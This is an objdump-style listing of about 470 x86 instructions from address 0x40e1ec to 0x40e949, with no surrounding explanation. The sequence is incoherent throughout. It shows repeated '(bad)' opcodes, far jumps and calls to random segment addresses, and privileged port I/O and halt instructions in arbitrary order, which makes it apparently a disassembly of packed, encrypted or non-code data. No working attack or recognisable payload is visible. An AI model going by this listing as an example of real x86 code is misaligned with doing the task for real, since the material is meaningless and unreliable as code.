  40e1ec:	sti    
  40e1ed:	jmp    0x95fb8e50
  40e1f2:	mov    esp,0x75111687
  40e1f7:	mov    ds:0x5e7097bd,eax
  40e1fc:	test   eax,0xcaea286d
  40e201:	sub    cl,dh
  40e203:	(bad)  
  40e204:	imul   BYTE PTR [eax+edx*1+0xd034cca]
  40e20b:	int    0x31
  40e20d:	fwait
  40e20e:	dec    esi
  40e20f:	jae    0x40e1eb
  40e211:	(bad)  
  40e212:	iret   
  40e213:	cmp    al,0xb3
  40e215:	add    ah,cl
  40e217:	pop    ss
  40e218:	pop    edx
  40e219:	xor    esi,ebp
  40e21b:	or     DWORD PTR ds:0xf8ff04f8,esp
  40e221:	or     al,BYTE PTR [edx]
  40e223:	ror    DWORD PTR [edx+0x25],cl
  40e226:	cmc    
  40e227:	xchg   ebp,eax
  40e228:	stos   BYTE PTR es:[edi],al
  40e229:	rcl    BYTE PTR [esp+ebp*2-0x7f],cl
  40e22d:	pop    edi
  40e22e:	(bad)  
  40e22f:	sbb    BYTE PTR [esi],bh
  40e231:	jle    0x40e285
  40e233:	jbe    0x40e223
  40e235:	jmp    0x40e294
  40e237:	out    dx,al
  40e238:	imul   edi,ecx,0xad725282
  40e23e:	ins    DWORD PTR es:[edi],dx
  40e23f:	sahf   
  40e240:	push   ebp
  40e241:	popf   
  40e242:	sti    
  40e243:	dec    edi
  40e244:	pop    es
  40e245:	bswap  esp
  40e247:	mov    dh,0xea
  40e249:	nop
  40e24a:	xchg   edi,eax
  40e24b:	adc    al,0x4f
  40e24d:	std    
  40e24e:	ss nop
  40e250:	dec    ebx
  40e251:	das    
  40e252:	push   esi
  40e253:	and    eax,0x46cd646a
  40e258:	mov    dh,0x82
  40e25a:	cmp    al,0x31
  40e25c:	into   
  40e25d:	adc    DWORD PTR [eax-0x41],ebx
  40e260:	popf   
  40e261:	inc    BYTE PTR [ecx+0x45]
  40e264:	shl    si,0x5c
  40e268:	sbb    DWORD PTR [edx-0x33ee60d6],ebx
  40e26e:	push   esi
  40e26f:	mov    bl,BYTE PTR [eax]
  40e271:	ins    DWORD PTR es:[edi],dx
  40e272:	es enter 0xfefa,0xcc
  40e277:	adc    ecx,esp
  40e279:	into   
  40e27a:	addr16 jl 0x40e225
  40e27d:	sbb    DWORD PTR [esi+edx*1],0xffffffc5
  40e281:	cdq    
  40e282:	cs mov edx,0x71b6dabe
  40e288:	scas   eax,DWORD PTR es:[edi]
  40e289:	sub    DWORD PTR ds:0x9e99a4eb,edi
  40e28f:	adc    al,0xe6
  40e291:	push   esp
  40e292:	mov    esi,0xfc9df16c
  40e297:	jmp    0x9c6e099c
  40e29c:	retf   
  40e29d:	test   eax,0x2673ac2b
  40e2a2:	aaa    
  40e2a3:	inc    edx
  40e2a4:	add    esi,DWORD PTR [bp+si-0x33]
  40e2a8:	aam    0x13
  40e2aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ab:	test   ah,al
  40e2ad:	cli    
  40e2ae:	punpckhwd mm5,QWORD PTR [esi]
  40e2b1:	xchg   esi,eax
  40e2b2:	mov    dh,0x8e
  40e2b4:	not    BYTE PTR [ecx-0x45]
  40e2b7:	xlat   BYTE PTR ds:[ebx]
  40e2b8:	in     al,dx
  40e2b9:	inc    esp
  40e2ba:	and    esi,ecx
  40e2bc:	fs (bad) 
  40e2be:	stos   DWORD PTR es:[edi],eax
  40e2bf:	retf   0xb39f
  40e2c2:	jb     0x40e32a
  40e2c4:	pop    ds
  40e2c5:	popf   
  40e2c6:	imul   esp,DWORD PTR [eax+0x5b517007],0xd337fc1d
  40e2d0:	mov    ah,0xdc
  40e2d2:	xchg   esi,eax
  40e2d3:	xchg   esp,eax
  40e2d4:	pop    ebp
  40e2d5:	mov    ds,ecx
  40e2d7:	mov    ebp,es
  40e2d9:	iret   
  40e2da:	pop    edx
  40e2db:	mov    edi,DWORD PTR [edi+0x3783d5b0]
  40e2e1:	add    ah,bh
  40e2e3:	mov    WORD PTR [ebp+0x29294aca],?
  40e2e9:	lahf   
  40e2ea:	mov    cs,WORD PTR ds:0x30aff921
  40e2f0:	push   edi
  40e2f1:	xlat   BYTE PTR ds:[ebx]
  40e2f2:	fnstcw WORD PTR [eax+0x2b]
  40e2f5:	ins    BYTE PTR es:[edi],dx
  40e2f6:	call   0xe49336d3
  40e2fb:	fwait
  40e2fc:	mov    DWORD PTR ds:0x7abb2623,0xbdb0fe06
  40e306:	mov    al,ds:0x8f8e996
  40e30b:	push   ebx
  40e30c:	mov    edx,0x3de74a3b
  40e311:	hlt    
  40e312:	aad    0x1e
  40e314:	mov    ecx,0x7ca11fc7
  40e319:	dec    ebx
  40e31a:	jnp    0x40e311
  40e31c:	jnp    0x40e329
  40e31e:	inc    eax
  40e31f:	(bad)  
  40e320:	xor    DWORD PTR [ebp-0x76],ebx
  40e323:	push   edx
  40e324:	call   0x47ae649d
  40e329:	sub    ebp,DWORD PTR [ecx]
  40e32b:	adc    ecx,edx
  40e32d:	cdq    
  40e32e:	mov    al,ds:0xad54cef2
  40e333:	pop    ecx
  40e334:	pop    ebx
  40e335:	push   esi
  40e336:	sar    BYTE PTR [ebx],cl
  40e338:	test   eax,esi
  40e33a:	lock xchg esp,eax
  40e33c:	stos   BYTE PTR es:[edi],al
  40e33d:	fs in  eax,0xd6
  40e340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e341:	mov    dl,0xb3
  40e343:	xchg   esi,eax
  40e344:	(bad)  
  40e346:	aam    0x78
  40e348:	xchg   edi,eax
  40e349:	out    dx,eax
  40e34a:	mov    esi,DWORD PTR [ebp+ebp*1+0x1f]
  40e34e:	jnp    0x40e2f6
  40e350:	dec    ebp
  40e351:	add    al,0xa8
  40e353:	in     al,0x63
  40e355:	scas   eax,DWORD PTR es:[edi]
  40e356:	inc    ecx
  40e357:	out    0x82,al
  40e359:	ins    DWORD PTR es:[edi],dx
  40e35a:	dec    eax
  40e35b:	jp     0x40e3a4
  40e35d:	imul   ebx,edi,0xda0cde42
  40e363:	dec    ebp
  40e364:	mov    gs:0xab6802c6,eax
  40e36a:	dec    edi
  40e36b:	pop    edx
  40e36c:	test   DWORD PTR [ecx-0x43],eax
  40e36f:	div    BYTE PTR [edi]
  40e371:	jle    0x40e3bc
  40e373:	cmp    BYTE PTR [ebx+0x4f],al
  40e376:	pop    ebx
  40e377:	push   0xbe7e63a6
  40e37c:	adc    edi,esi
  40e37e:	push   ss
  40e37f:	pushf  
  40e380:	aam    0x5e
  40e382:	clc    
  40e383:	xchg   ecx,eax
  40e384:	repnz (bad) 
  40e387:	jg     0x40e31d
  40e389:	sub    ch,cl
  40e38b:	mov    ch,0xbe
  40e38d:	fincstp 
  40e38f:	call   0xac71541f
  40e394:	mov    bh,0x6c
  40e396:	je     0x40e33c
  40e398:	daa    
  40e399:	dec    ebp
  40e39a:	mov    al,0x68
  40e39c:	push   edi
  40e39d:	sbb    BYTE PTR [edi+0x4d],bl
  40e3a0:	inc    edi
  40e3a1:	sbb    edi,DWORD PTR [esi-0x3a]
  40e3a4:	frndint 
  40e3a6:	retf   0x53a8
  40e3a9:	jne    0x40e3f9
  40e3ab:	and    BYTE PTR [eax+eiz*4],0xfa
  40e3af:	mov    eax,0xc99f02f0
  40e3b4:	inc    ebp
  40e3b5:	adc    esp,DWORD PTR [esi+ebp*4-0x24494dbd]
  40e3bc:	loop   0x40e391
  40e3be:	sbb    BYTE PTR [edi-0x64058821],bl
  40e3c4:	fld    TBYTE PTR [ebx-0x35daa45]
  40e3ca:	inc    ebp
  40e3cb:	mov    dl,0x51
  40e3cd:	push   ebx
  40e3ce:	jl     0x40e355
  40e3d0:	cmp    edi,DWORD PTR [edi]
  40e3d2:	inc    ebp
  40e3d3:	mov    ds:0x298d4d45,eax
  40e3d8:	push   ss
  40e3d9:	fadd   QWORD PTR [edi+0x1a]
  40e3dc:	lahf   
  40e3dd:	dec    edx
  40e3de:	ins    DWORD PTR es:[edi],dx
  40e3df:	push   ds
  40e3e0:	pop    edi
  40e3e1:	jbe    0x40e365
  40e3e3:	sar    ebx,0x57
  40e3e6:	xchg   ecx,eax
  40e3e7:	aas    
  40e3e8:	add    eax,eax
  40e3ea:	(bad)  
  40e3eb:	sub    al,0xb3
  40e3ed:	stc    
  40e3ee:	add    ah,0x90
  40e3f1:	or     al,0x59
  40e3f3:	fnstcw WORD PTR [esi+0x2e]
  40e3f6:	dec    edi
  40e3f7:	pop    ss
  40e3f8:	ds sbb esp,0x24554d12
  40e3ff:	inc    edx
  40e400:	pop    ss
  40e401:	call   0x645d3b36
  40e406:	jge    0x40e482
  40e408:	pop    edx
  40e409:	lahf   
  40e40a:	dec    BYTE PTR [eax+0x8]
  40e40d:	mov    cl,0x80
  40e40f:	inc    edi
  40e410:	(bad)  
  40e412:	fstp   QWORD PTR [edi]
  40e414:	mov    ds:0x80189b5c,eax
  40e419:	cmova  ecx,DWORD PTR [eax+0x761edd78]
  40e420:	cwde   
  40e421:	inc    eax
  40e422:	adc    ecx,ebx
  40e424:	jbe    0x40e426
  40e426:	hlt    
  40e427:	loopne 0x40e41e
  40e429:	mov    DWORD PTR [edi*4+0x4ed27983],0x8309c3d0
  40e434:	repz xor al,0x41
  40e437:	ins    DWORD PTR es:[edi],dx
  40e438:	stc    
  40e439:	mov    bh,0xe8
  40e43b:	dec    ebp
  40e43c:	sbb    al,0x68
  40e43e:	enter  0x33b4,0x14
  40e442:	add    al,0x67
  40e444:	data16 sbb BYTE PTR [edx],ch
  40e447:	out    dx,al
  40e448:	fwait
  40e449:	jns    0x40e426
  40e44b:	fnstsw WORD PTR [edx+0x77af2a95]
  40e451:	inc    esp
  40e452:	push   0x2a7079a8
  40e457:	inc    esi
  40e458:	adc    DWORD PTR [eax+edi*4-0x7e],0x45
  40e45d:	out    dx,al
  40e45e:	mov    esp,0xd41bc4c0
  40e463:	adc    al,0x68
  40e465:	shl    BYTE PTR [edx+ebx*1],cl
  40e468:	hlt    
  40e469:	mov    ebp,0xdc39389d
  40e46e:	pop    eax
  40e46f:	push   ebp
  40e470:	ds int3 
  40e472:	xchg   edi,eax
  40e473:	ret    
  40e474:	xchg   edi,eax
  40e475:	sbb    bh,BYTE PTR [ebp+0x31c145f0]
  40e47b:	mov    ds:0x5be5ca54,eax
  40e480:	inc    edx
  40e481:	repz cmp al,0x85
  40e484:	xor    DWORD PTR [ebx-0x5a398180],esp
  40e48a:	inc    edx
  40e48b:	das    
  40e48c:	(bad)  
  40e48d:	cld    
  40e48e:	outs   dx,DWORD PTR ds:[esi]
  40e48f:	(bad)  
  40e490:	(bad)  
  40e491:	jmp    0x40e41e
  40e493:	inc    edi
  40e494:	dec    ebx
  40e495:	mov    edx,DWORD PTR [ecx]
  40e497:	mov    es,WORD PTR [ebp+0xc076ff]
  40e49d:	push   0x873d8ce2
  40e4a2:	ins    BYTE PTR es:[edi],dx
  40e4a3:	int    0x27
  40e4a5:	mul    al
  40e4a7:	push   ecx
  40e4a8:	nop
  40e4a9:	cli    
  40e4aa:	aaa    
  40e4ab:	cmp    eax,0xda35defb
  40e4b0:	shl    dl,cl
  40e4b2:	and    eax,0x64d5510b
  40e4b7:	cld    
  40e4b8:	pop    ss
  40e4b9:	jge    0x40e45e
  40e4bb:	xchg   esi,eax
  40e4bc:	dec    edi
  40e4bd:	ror    DWORD PTR [eax-0xf5b8cce],0xa5
  40e4c4:	fiadd  DWORD PTR [edx+eiz*1-0xcd340f]
  40e4cb:	mul    DWORD PTR [edi-0x48]
  40e4ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4cf:	mov    esi,0x629e1d0d
  40e4d4:	xchg   esp,eax
  40e4d5:	fs pop esi
  40e4d7:	xor    eax,0x97cbdedf
  40e4dc:	stos   BYTE PTR es:[edi],al
  40e4dd:	xchg   DWORD PTR ds:0xd231739a,eax
  40e4e3:	mov    esp,0x46eeeaa3
  40e4e8:	in     al,0x35
  40e4ea:	not    DWORD PTR [eax+0x2ff74c3]
  40e4f0:	mov    edx,0x302f7aeb
  40e4f5:	sub    bh,BYTE PTR [ecx+0x29e4058e]
  40e4fb:	add    eax,0xd6ae1315
  40e500:	shl    DWORD PTR [ecx+0x44],cl
  40e503:	inc    ecx
  40e504:	pop    edx
  40e505:	lods   eax,DWORD PTR ds:[esi]
  40e506:	pop    ebp
  40e507:	adc    ah,BYTE PTR [ecx+0x3e]
  40e50a:	std    
  40e50b:	xchg   esp,eax
  40e50c:	pusha  
  40e50d:	mov    bl,BYTE PTR [esi]
  40e50f:	or     DWORD PTR [ecx-0x8aa31c],edi
  40e515:	outs   dx,BYTE PTR ds:[esi]
  40e516:	xchg   ebp,eax
  40e517:	in     al,dx
  40e518:	(bad)  
  40e519:	push   esi
  40e51a:	mov    eax,ds:0x22fbe6c6
  40e51f:	cld    
  40e520:	je     0x40e567
  40e522:	leave  
  40e523:	xchg   ecx,eax
  40e524:	jp     0x40e585
  40e526:	mov    ch,cl
  40e528:	xchg   ebp,eax
  40e529:	lods   al,BYTE PTR ds:[esi]
  40e52a:	outs   dx,DWORD PTR ds:[esi]
  40e52b:	cdq    
  40e52c:	pop    ds
  40e52d:	mov    DWORD PTR [ebp+0x60677211],esp
  40e533:	test   eax,0x3fe6b4ef
  40e538:	(bad)  
  40e539:	int3   
  40e53a:	add    bh,ah
  40e53c:	mov    bl,0xad
  40e53e:	sbb    DWORD PTR [edx-0x1ee6bff7],eax
  40e544:	loope  0x40e5b2
  40e546:	or     eax,0xbe80dc30
  40e54b:	(bad)  
  40e54c:	mov    dl,0xe7
  40e54e:	mov    ch,0xcb
  40e550:	arpl   WORD PTR [ebx],cx
  40e552:	div    ebp
  40e554:	mov    dl,0xa3
  40e556:	dec    esp
  40e557:	jecxz  0x40e56e
  40e559:	loopne 0x40e4f5
  40e55b:	sub    bh,BYTE PTR [ebp+ecx*2+0x30]
  40e55f:	dec    esi
  40e560:	and    eax,0xe50ebea8
  40e565:	pusha  
  40e566:	mov    BYTE PTR [ebx+0x7c],0x36
  40e56a:	and    dl,BYTE PTR [eax]
  40e56c:	pop    ebx
  40e56d:	cmp    bh,BYTE PTR [esi+0x69a92c2c]
  40e573:	in     al,dx
  40e574:	in     al,0x49
  40e576:	(bad)  
  40e577:	stc    
  40e578:	push   es
  40e579:	pushw  cs
  40e57b:	popa   
  40e57c:	cdq    
  40e57d:	test   al,0x42
  40e57f:	sti    
  40e580:	sub    bl,BYTE PTR [ebp+0x11b2aa1c]
  40e586:	out    dx,eax
  40e587:	or     cl,BYTE PTR [edx]
  40e589:	sub    edx,DWORD PTR [esi+ebp*2]
  40e58c:	fsub   DWORD PTR [edx-0x53f2b79b]
  40e592:	xor    BYTE PTR [edx+edi*1+0x44],bl
  40e596:	mov    ds:0xb2d3781e,al
  40e59b:	daa    
  40e59c:	pop    es
  40e59d:	in     al,0x8c
  40e59f:	repz dec edx
  40e5a1:	push   eax
  40e5a2:	mov    WORD PTR [esi],fs
  40e5a4:	mov    WORD PTR [ebx+0x1b],es
  40e5a7:	in     eax,0x8b
  40e5a9:	es (bad) 
  40e5ab:	loope  0x40e550
  40e5ad:	imul   ebx,DWORD PTR [ebx],0x5e99dd8
  40e5b3:	mov    ebx,0xcd3b2584
  40e5b8:	push   ebp
  40e5b9:	sbb    eax,0xedc9bc86
  40e5be:	mov    dl,0x2c
  40e5c0:	sbb    esp,esp
  40e5c2:	xchg   DWORD PTR [esi-0x67d54220],esp
  40e5c8:	mov    dh,0xe4
  40e5ca:	(bad)  
  40e5cb:	rcr    DWORD PTR [esi-0x12],0xba
  40e5cf:	out    0xea,al
  40e5d1:	repz aad 0xba
  40e5d4:	jno    0x40e5cd
  40e5d6:	jle    0x40e61d
  40e5d8:	push   es
  40e5d9:	stos   BYTE PTR es:[edi],al
  40e5da:	popa   
  40e5db:	gs push eax
  40e5dd:	mov    ah,bl
  40e5df:	or     DWORD PTR [edx-0x79],esi
  40e5e2:	push   cs
  40e5e3:	push   esi
  40e5e4:	mov    bh,0xe9
  40e5e6:	test   BYTE PTR [esi],bl
  40e5e8:	pop    es
  40e5e9:	aas    
  40e5ea:	stc    
  40e5eb:	mov    edi,0x88137690
  40e5f0:	inc    eax
  40e5f1:	js     0x40e5cb
  40e5f3:	xor    ch,al
  40e5f5:	jp     0x40e58b
  40e5f7:	sahf   
  40e5f8:	enter  0x7881,0xea
  40e5fc:	ror    DWORD PTR [ecx],0x89
  40e5ff:	lea    eax,[ecx]
  40e601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e602:	inc    ecx
  40e603:	xchg   ecx,eax
  40e604:	dec    edx
  40e605:	ja     0x40e639
  40e607:	ss pusha 
  40e609:	mov    ecx,0x1a16d76
  40e60e:	jno    0x40e682
  40e610:	mov    bl,cl
  40e612:	push   esi
  40e613:	mov    al,0xe3
  40e615:	or     ebx,ecx
  40e617:	mov    esp,0x1a9f2d3f
  40e61c:	sbb    BYTE PTR [ecx],bl
  40e61e:	pop    ds
  40e61f:	mov    ebp,0xb971ea5d
  40e624:	ja     0x40e65c
  40e626:	loope  0x40e5bc
  40e628:	stos   BYTE PTR es:[edi],al
  40e629:	cld    
  40e62a:	and    BYTE PTR [esi+0xa379439],dh
  40e630:	imul   esi,edi,0x6b411c4f
  40e636:	arpl   si,dx
  40e638:	fist   DWORD PTR [ecx]
  40e63a:	jge    0x40e61e
  40e63c:	hlt    
  40e63d:	mov    bh,0x63
  40e63f:	push   0x1f
  40e641:	jmp    0xb09e:0x18d2eb31
  40e648:	jbe    0x40e629
  40e64a:	mov    esp,0x2db23722
  40e64f:	out    0x6b,al
  40e651:	in     eax,0xf5
  40e653:	and    ah,BYTE PTR [ecx]
  40e655:	test   BYTE PTR [ecx],bh
  40e657:	pop    eax
  40e658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e659:	ret    
  40e65a:	add    esi,DWORD PTR [edi+0x4669f548]
  40e660:	sbb    bl,BYTE PTR [ebx-0x16]
  40e663:	pop    ebx
  40e664:	adc    DWORD PTR [ebx+0x78e4cc3f],esi
  40e66a:	in     al,0xaa
  40e66c:	outs   dx,BYTE PTR ds:[esi]
  40e66d:	ja     0x40e5f0
  40e66f:	call   0x1347:0xd64bf765
  40e676:	mov    esi,0xff497dd5
  40e67b:	xor    edi,ebx
  40e67d:	sahf   
  40e67e:	aam    0x7c
  40e680:	lahf   
  40e681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e682:	gs pop ecx
  40e684:	mov    edx,0x38b23972
  40e689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e68a:	retf   
  40e68b:	fscale 
  40e68d:	sub    BYTE PTR [ebx-0x66854f94],dh
  40e693:	or     al,0xce
  40e695:	js     0x40e67c
  40e697:	fsubr  QWORD PTR [eax+edi*4-0x70ab8605]
  40e69e:	pop    ecx
  40e69f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6a0:	cwde   
  40e6a1:	mov    dl,0x1
  40e6a3:	inc    ebx
  40e6a4:	dec    ecx
  40e6a5:	or     DWORD PTR ds:0xa3d18de3,esp
  40e6ab:	pusha  
  40e6ac:	jae    0x40e6ee
  40e6ae:	loope  0x40e712
  40e6b0:	or     al,0xb0
  40e6b2:	(bad)  
  40e6b3:	int    0x5e
  40e6b5:	ins    BYTE PTR es:[edi],dx
  40e6b6:	ja     0x40e72b
  40e6b8:	fisttp QWORD PTR [esi+0x66]
  40e6bb:	sbb    eax,0xffffffee
  40e6be:	stos   BYTE PTR es:[edi],al
  40e6bf:	sub    esi,ecx
  40e6c1:	lds    ebx,FWORD PTR [edx-0x42112fb4]
  40e6c7:	sbb    BYTE PTR [edi-0x227abfb3],bh
  40e6cd:	lahf   
  40e6ce:	shr    ebp,1
  40e6d0:	test   al,0xb0
  40e6d2:	dec    BYTE PTR [esi+0x7c57b947]
  40e6d8:	mov    WORD PTR [ecx],?
  40e6da:	std    
  40e6db:	or     edx,DWORD PTR [edi-0x3ec10748]
  40e6e1:	ins    BYTE PTR es:[edi],dx
  40e6e2:	addr16 mov eax,ds:0x4ba
  40e6e6:	dec    esp
  40e6e7:	inc    ebx
  40e6e8:	clc    
  40e6e9:	add    BYTE PTR [esi],al
  40e6eb:	test   DWORD PTR [eax+0x17e041b2],esp
  40e6f1:	cmp    DWORD PTR [edx+0x4b82cb3a],eax
  40e6f7:	cmp    eax,edi
  40e6f9:	push   ebx
  40e6fa:	inc    eax
  40e6fb:	xor    al,0x21
  40e6fd:	(bad)  
  40e6fe:	int    0xae
  40e700:	mov    bh,0xa6
  40e702:	mov    dl,0xb9
  40e704:	pop    ebp
  40e705:	mov    esp,0xe03cf95d
  40e70a:	test   DWORD PTR [eax-0x7],ebp
  40e70d:	and    ah,BYTE PTR [eax]
  40e70f:	adc    ebp,DWORD PTR [eax-0x7d]
  40e712:	inc    esp
  40e713:	inc    esp
  40e714:	pop    edi
  40e715:	pop    ss
  40e716:	mov    esp,0xe982199a
  40e71b:	adc    dh,cl
  40e71d:	cmp    DWORD PTR [esi],0xffffffc4
  40e720:	iret   
  40e721:	cs sub eax,0xeb73c02f
  40e727:	add    eax,DWORD PTR [ebp-0x53c99de6]
  40e72d:	sub    BYTE PTR [ebx],bh
  40e72f:	inc    ebp
  40e730:	and    DWORD PTR ds:0x56eec90e,ecx
  40e736:	inc    ecx
  40e737:	jge    0x40e769
  40e739:	mov    ebx,0x9efe6aa1
  40e73e:	adc    al,0xad
  40e740:	add    cl,BYTE PTR [ebx]
  40e742:	mov    eax,DWORD PTR [ecx]
  40e744:	xlat   BYTE PTR ds:[ebx]
  40e745:	sub    eax,0x8169e3e3
  40e74a:	fwait
  40e74b:	mov    ah,0x2f
  40e74d:	xchg   esp,eax
  40e74e:	and    bh,BYTE PTR [esp+eax*1-0x43262b3a]
  40e755:	cli    
  40e756:	xchg   ecx,eax
  40e757:	sbb    eax,0xe7134ef0
  40e75c:	mov    cl,0x8b
  40e75e:	call   0x2caa:0x4fed27b3
  40e765:	retf   0x6181
  40e768:	inc    edx
  40e769:	call   0xc220:0x205d1aa6
  40e770:	push   edi
  40e771:	jmp    0x40e789
  40e773:	lds    esp,FWORD PTR [ebx]
  40e775:	and    al,0x30
  40e777:	push   edx
  40e778:	inc    ebp
  40e779:	dec    ebx
  40e77a:	arpl   WORD PTR [edi+0x5],dx
  40e77d:	cmp    al,0x7b
  40e77f:	or     eax,0xcce738f9
  40e784:	push   ebp
  40e785:	cs xchg esp,eax
  40e787:	jge    0x40e752
  40e789:	fcmovnu st,st(1)
  40e78b:	inc    dh
  40e78d:	fdiv   DWORD PTR [edx]
  40e78f:	add    eax,DWORD PTR [ebp+0x30]
  40e792:	or     DWORD PTR [edi],esp
  40e794:	mov    ds:0x1163a250,eax
  40e799:	adc    BYTE PTR gs:[edi],bl
  40e79c:	mov    cl,0x96
  40e79e:	shl    DWORD PTR [ebp-0x4c932db3],cl
  40e7a4:	inc    ebx
  40e7a5:	into   
  40e7a6:	outs   dx,DWORD PTR ds:[esi]
  40e7a7:	jb     0x40e806
  40e7a9:	push   ebx
  40e7aa:	daa    
  40e7ab:	xchg   BYTE PTR [ebx],bl
  40e7ad:	sub    dl,ch
  40e7af:	pop    esp
  40e7b0:	scas   eax,DWORD PTR es:[edi]
  40e7b1:	xor    BYTE PTR [ecx],0x56
  40e7b4:	ds fs js 0x40e788
  40e7b8:	lods   eax,DWORD PTR ds:[esi]
  40e7b9:	into   
  40e7ba:	inc    ebp
  40e7bb:	add    eax,0x65013fba
  40e7c0:	clc    
  40e7c1:	or     al,0x9b
  40e7c3:	jbe    0x40e80d
  40e7c5:	mov    al,ds:0x4658de65
  40e7ca:	sar    esp,cl
  40e7cc:	mov    ecx,0x573d83a1
  40e7d1:	mov    eax,ds:0x5d33aaad
  40e7d6:	push   es
  40e7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7d8:	dec    esi
  40e7d9:	std    
  40e7da:	out    dx,al
  40e7db:	mov    cl,cl
  40e7dd:	out    dx,eax
  40e7de:	pop    edi
  40e7df:	and    esp,DWORD PTR [edi+0x59d82709]
  40e7e5:	xchg   edx,eax
  40e7e6:	scas   al,BYTE PTR es:[edi]
  40e7e7:	out    0xbe,eax
  40e7e9:	mov    eax,0x95471e1c
  40e7ee:	test   BYTE PTR [esi+0x3c],bh
  40e7f1:	xchg   ecx,eax
  40e7f2:	aas    
  40e7f3:	mov    ch,0x44
  40e7f5:	adc    eax,0x70661de9
  40e7fa:	cmc    
  40e7fb:	into   
  40e7fc:	pop    ebp
  40e7fd:	sbb    eax,0x5bfdcf9b
  40e802:	sbb    BYTE PTR [ebp-0x394d70a5],al
  40e808:	push   ebp
  40e809:	aas    
  40e80a:	push   es
  40e80b:	mov    bh,0x82
  40e80d:	test   eax,0xebb7737a
  40e812:	aaa    
  40e813:	and    BYTE PTR [edi-0x1c93efe6],dl
  40e819:	mov    BYTE PTR [ebx-0x34],dl
  40e81c:	lds    eax,FWORD PTR [ebp+0xd0a9fd1]
  40e822:	sbb    dl,BYTE PTR [ecx+0x37c9c2e3]
  40e828:	mov    esi,0xacc9579c
  40e82d:	bnd jp 0x40e869
  40e830:	adc    DWORD PTR [ebx+0x7ef1bda2],ebx
  40e836:	push   0xffffff8e
  40e838:	adc    ebp,DWORD PTR [eax-0x7031de9f]
  40e83e:	push   ebp
  40e83f:	scas   eax,DWORD PTR es:[edi]
  40e840:	add    BYTE PTR [ebp-0x3c],ch
  40e843:	cmp    al,0x49
  40e845:	jne    0x40e8ae
  40e847:	rcr    DWORD PTR [edx-0x61af67a9],0xa6
  40e84e:	mov    esp,0x88162563
  40e853:	xchg   edx,eax
  40e854:	push   0xffffff9b
  40e856:	xor    ebp,ebx
  40e858:	fdivr  QWORD PTR [edx+eiz*2+0x6e]
  40e85c:	inc    eax
  40e85d:	stos   BYTE PTR es:[edi],al
  40e85e:	dec    esp
  40e85f:	sahf   
  40e860:	mov    al,ds:0x63831455
  40e865:	jnp    0x40e8c4
  40e867:	aam    0x4f
  40e869:	(bad)  
  40e86a:	ins    DWORD PTR es:[di],dx
  40e86c:	xchg   ebp,eax
  40e86d:	jmp    0x1513:0xa364da6
  40e874:	call   0xe875:0xda80f2a2
  40e87b:	inc    edx
  40e87c:	dec    esi
  40e87d:	repz fcom st(7)
  40e880:	lock mov esp,0xc39c864b
  40e886:	mov    edi,0x86e64874
  40e88b:	and    eax,0x869f1448
  40e890:	xor    al,0x42
  40e892:	add    DWORD PTR [ebp+0x65],esp
  40e895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e896:	ficomp DWORD PTR [edx]
  40e898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e899:	xor    DWORD PTR [ebp+0x422ffa53],eax
  40e89f:	inc    esi
  40e8a0:	mov    esi,gs
  40e8a2:	mov    edi,0xbd8db1e1
  40e8a7:	inc    edx
  40e8a8:	adc    esi,DWORD PTR [edi+0x39]
  40e8ab:	inc    eax
  40e8ac:	sub    DWORD PTR [ecx+0x39d27466],esi
  40e8b2:	scas   eax,DWORD PTR es:[edi]
  40e8b3:	lods   al,BYTE PTR ds:[esi]
  40e8b4:	pop    eax
  40e8b5:	out    0x39,eax
  40e8b7:	add    BYTE PTR [eax+0x1a],dl
  40e8ba:	pop    ebp
  40e8bb:	orps   xmm4,XMMWORD PTR [ecx+0x11d4bfad]
  40e8c2:	push   0x28b65355
  40e8c7:	mov    edx,0x9f52c69
  40e8cc:	mov    bh,0xab
  40e8ce:	xor    DWORD PTR [edx],eax
  40e8d0:	adc    BYTE PTR [edi],ah
  40e8d2:	mov    eax,ds:0x770a77fb
  40e8d7:	cmp    ecx,DWORD PTR [edi+0x2]
  40e8da:	popa   
  40e8db:	mov    ah,0xa1
  40e8dd:	outs   dx,BYTE PTR ds:[esi]
  40e8de:	jp     0x40e87f
  40e8e0:	and    dh,dh
  40e8e2:	inc    ebp
  40e8e3:	sbb    BYTE PTR [edi-0x7d],bl
  40e8e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8e7:	inc    edx
  40e8e8:	xchg   ebp,eax
  40e8e9:	cmp    eax,0x36843dc4
  40e8ee:	and    al,0xbb
  40e8f0:	push   esi
  40e8f1:	push   ds
  40e8f2:	imul   ecx,DWORD PTR [ebx-0x7],0x66979927
  40e8f9:	shr    BYTE PTR ss:[edx-0x53d3520e],0xc6
  40e901:	jns    0x40e900
  40e903:	xlat   BYTE PTR ds:[ebx]
  40e904:	lods   al,BYTE PTR ds:[esi]
  40e905:	cdq    
  40e906:	mov    bl,0x60
  40e908:	sbb    esi,DWORD PTR [ecx]
  40e90a:	inc    esi
  40e90b:	call   0x4c4693b
  40e910:	mov    bh,0xf6
  40e912:	pop    edx
  40e913:	cmp    DWORD PTR [ebx],edi
  40e915:	aas    
  40e916:	imul   ecx,DWORD PTR [edi-0x17],0xffffffa7
  40e91a:	xchg   esi,eax
  40e91b:	dec    edi
  40e91c:	outs   dx,DWORD PTR ds:[esi]
  40e91d:	dec    eax
  40e91e:	sbb    al,0xa
  40e920:	mov    esp,0x89912c99
  40e925:	(bad)  
  40e926:	into   
  40e927:	cmp    DWORD PTR [edx-0x6a1ed8aa],ebp
  40e92d:	pusha  
  40e92e:	sub    DWORD PTR [eax-0x6ddae591],ebp
  40e934:	and    al,dh
  40e936:	les    ecx,FWORD PTR [esi+0x8]
  40e939:	stos   BYTE PTR es:[edi],al
  40e93a:	les    esi,FWORD PTR [ecx-0x1d]
  40e93d:	mov    esi,0x233fa932
  40e942:	ret    0xff91
  40e945:	sub    BYTE PTR [ebx+0x23],0x25
  40e949:	add    DWORD PTR [edi],ebx
